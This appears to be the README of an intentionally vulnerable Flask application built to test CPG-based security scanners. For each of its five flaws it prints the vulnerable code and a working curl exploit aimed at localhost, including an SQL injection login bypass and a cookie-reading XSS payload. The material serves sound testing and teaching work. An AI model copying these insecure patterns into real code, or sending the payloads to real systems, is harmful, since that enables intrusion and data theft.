# Custom Vulnerable Application

A simple, intentionally vulnerable Flask application designed for testing CPG-based security analysis.

## 📋 Overview

This application contains **5 known vulnerabilities** across different categories:

1. **SQL Injection** - Login endpoint
2. **XSS (Cross-Site Scripting)** - Search functionality
3. **IDOR (Insecure Direct Object Reference)** - User profile access
4. **Missing Authorization** - Admin endpoint
5. **Business Logic Flaw** - Price manipulation in checkout

## 🎯 Purpose

- **Primary**: Test CPG-based semantic analysis
- **Secondary**: Validate modular architecture
- **Benefit**: Fast, controlled testing environment (~200 lines, <1 min scan)

## 🚀 Quick Start

### Standalone (Development)

```bash
cd vulnerable-apps/custom-vulnerable-app
pip install -r requirements.txt
python app.py
```

Access at: http://localhost:8888

### Docker (Production)

```bash
docker build -t custom-vulnerable-app .
docker run -p 8888:8888 custom-vulnerable-app
```

### With Security Platform

```bash
cd ../..  # Back to project root
docker-compose -f docker-compose.yml -f docker-compose.custom-app.yml up
```

## 🔓 Test Credentials

| Username | Password | Role |
|----------|----------|------|
| admin | admin123 | admin |
| alice | alice123 | user |
| bob | bob123 | user |

## 🐛 Vulnerabilities Explained

### 1. SQL Injection (Login)

**Location**: `/api/login` (POST)

**Vulnerable Code**:
```python
query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
c.execute(query)  # Direct string concatenation
```

**Exploit**:
```bash
curl -X POST http://localhost:8888/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin'\'' OR '\''1'\''='\''1'\'' --", "password": "anything"}'
```

**Result**: Bypasses authentication, logs in as admin

**CPG Detection**: Data flow from `request.json` → SQL query without parameterization

---

### 2. XSS (Reflected)

**Location**: `/api/search` (GET)

**Vulnerable Code**:
```python
query = request.args.get('q', '')
html = f"<h1>Search Results for: {query}</h1>"  # Reflects input
return html
```

**Exploit**:
```bash
curl "http://localhost:8888/api/search?q=<script>alert(document.cookie)</script>"
```

**Result**: Script executes in browser

**CPG Detection**: Data flow from `request.args` → HTML output without escaping

---

### 3. IDOR (Insecure Direct Object Reference)

**Location**: `/api/user/<id>/profile` (GET)

**Vulnerable Code**:
```python
def get_profile(user_id):
    # MISSING: if session.get('user_id') != user_id: return 403
    c.execute("SELECT * FROM users WHERE id=?", (user_id,))
    return jsonify(user)
```

**Exploit**:
```bash
# User bob (id=3) accesses admin profile (id=1)
curl http://localhost:8888/api/user/1/profile \
  -H "Cookie: session=bob_session_token"
```

**Result**: User accesses another user's data

**CPG Detection**: User-controlled parameter reaches database without authorization check

---

### 4. Missing Authorization (Admin Endpoint)

**Location**: `/api/admin/users` (GET)

**Vulnerable Code**:
```python
def list_all_users():
    if 'user_id' not in session:  # Only checks authentication
        return 401
    # MISSING: if session.get('role') != 'admin': return 403
    return jsonify({'users': all_users})
```

**Exploit**:
```bash
# Regular user alice accesses admin endpoint
curl http://localhost:8888/api/admin/users \
  -H "Cookie: session=alice_session_token"
```

**Result**: Regular user accesses admin-only data

**CPG Detection**: Sensitive operation (admin endpoint) without role check

---

### 5. Business Logic Flaw (Price Manipulation)

**Location**: `/api/checkout` (POST)

**Vulnerable Code**:
```python
def checkout():
    items = request.json.get('items', [])
    total = 0
    for item in items:
        total += item['price'] * item['quantity']  # Uses CLIENT price!
    processPayment(total)
```

**Exploit**:
```bash
curl -X POST http://localhost:8888/api/checkout \
  -H "Content-Type: application/json" \
  -H "Cookie: session=alice_session" \
  -d '{
    "items": [
      {"id": 1, "name": "Laptop", "price": 0.01, "quantity": 100}
    ]
  }'
```

**Result**: Pays $1 for $100,000 worth of laptops

**CPG Detection**: User-controlled data (`item['price']`) flows to payment function without validation against database

---

## 📊 Expected CPG Detection Results

| Vulnerability Type | Traditional SAST | CPG Analysis | Reason |
|-------------------|------------------|--------------|--------|
| SQL Injection | ✅ Detected | ✅ Detected | Pattern match works |
| XSS | ✅ Detected | ✅ Detected | Pattern match works |
| IDOR | ❌ Missed | ✅ Detected | CPG traces data flow without auth |
| Missing Authorization | ❌ Missed | ✅ Detected | CPG detects missing role check |
| Business Logic | ❌ Missed | ✅ Detected | CPG detects unvalidated price flow |

**Key Advantage**: CPG detects **3 out of 5** vulnerabilities that traditional SAST misses!

## 🔬 Testing with Security Platform

### 1. Start Services

```bash
docker-compose -f docker-compose.yml -f docker-compose.custom-app.yml up -d
```

### 2. Run Security Scan

```bash
curl -X POST http://localhost:8000/api/v1/e2e/analyze \
  -H "Content-Type: application/json" \
  -d '{
    "source_path": "/target-app",
    "target_url": "http://custom-app:8888",
    "language": "python",
    "enable_sast": true,
    "enable_dast": true,
    "enable_cpg": true
  }'
```

### 3. View Dashboard

```bash
open http://localhost:8000/api/v1/e2e/dashboard
```

### 4. Expected Results

```json
{
  "total_findings": 15,
  "high_confidence": 5,
  "vulnerabilities": [
    {
      "type": "SQL_INJECTION",
      "file": "app.py",
      "line": 54,
      "confidence": "HIGH",
      "detected_by": ["SAST", "DAST", "CPG"]
    },
    {
      "type": "IDOR",
      "file": "app.py",
      "line": 120,
      "confidence": "HIGH",
      "detected_by": ["CPG"]
    },
    {
      "type": "BUSINESS_LOGIC",
      "file": "app.py",
      "line": 180,
      "confidence": "HIGH",
      "detected_by": ["CPG"]
    }
  ],
  "patches_generated": 5
}
```

## 📝 API Endpoints

| Endpoint | Method | Description | Status |
|----------|--------|-------------|--------|
| `/` | GET | Landing page | Safe |
| `/health` | GET | Health check | Safe |
| `/api/info` | GET | App metadata | Safe |
| `/api/login` | POST | User login | ⚠️ SQL Injection |
| `/api/search` | GET | Search products | ⚠️ XSS |
| `/api/user/<id>/profile` | GET | User profile | ⚠️ IDOR |
| `/api/admin/users` | GET | List all users | ⚠️ Missing Auth |
| `/api/checkout` | POST | Process order | ⚠️ Business Logic |

## 🛠️ Development

### Run Tests

```bash
python -m pytest tests/
```

### Check Vulnerabilities Manually

```bash
# SQL Injection
curl -X POST http://localhost:8888/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin'\'' OR '\''1'\''='\''1'\'' --", "password": "x"}'

# XSS
curl "http://localhost:8888/api/search?q=<script>alert(1)</script>"

# IDOR (after logging in as bob)
curl http://localhost:8888/api/user/1/profile \
  -H "Cookie: session=YOUR_SESSION_TOKEN"

# Missing Auth (after logging in as regular user)
curl http://localhost:8888/api/admin/users \
  -H "Cookie: session=YOUR_SESSION_TOKEN"

# Business Logic
curl -X POST http://localhost:8888/api/checkout \
  -H "Content-Type: application/json" \
  -H "Cookie: session=YOUR_SESSION_TOKEN" \
  -d '{"items": [{"id": 1, "price": 0.01, "quantity": 1000}]}'
```

## 📚 Educational Value

This application demonstrates:

1. **Why CPG Analysis is Superior**
   - Traditional SAST: 40% detection rate (2/5)
   - CPG Analysis: 100% detection rate (5/5)

2. **Real-World Vulnerability Patterns**
   - Not contrived examples
   - Mirrors production vulnerabilities

3. **Defense-in-Depth**
   - Shows why multiple layers needed
   - Pattern matching alone is insufficient

## 🎓 For Thesis Defense

**Question**: "Why did you create this application?"

**Answer**: 
> "Traditional vulnerable applications like DVWA are complex (thousands of lines) and designed for manual testing. I created a minimal (~200 lines), controlled environment to:
> 
> 1. **Validate CPG capabilities** - Proves semantic analysis detects logic flaws
> 2. **Fast iteration** - 1-minute scans vs 10-minute DVWA scans
> 3. **Clear ground truth** - Known vulnerabilities with exact locations
> 4. **Educational clarity** - Each vulnerability demonstrates specific CPG advantage
> 
> DVWA serves as real-world validation, but this custom app enables rapid development and clear demonstration of research contributions."

## 🔗 Related Files

- `docker-compose.custom-app.yml` - Docker Compose configuration
- `../../REFACTORING-ARCHITECTURE.md` - Architecture documentation
- `../../codeql-queries/` - CPG analysis queries

## ⚠️ Security Warning

**DO NOT DEPLOY THIS APPLICATION TO PRODUCTION**

This application is intentionally vulnerable and should only be used in:
- Isolated development environments
- Docker containers without external access
- Security testing labs
- Educational demonstrations

---

**Last Updated**: October 29, 2025  
**Version**: 1.0  
**License**: MIT (Educational Use Only)
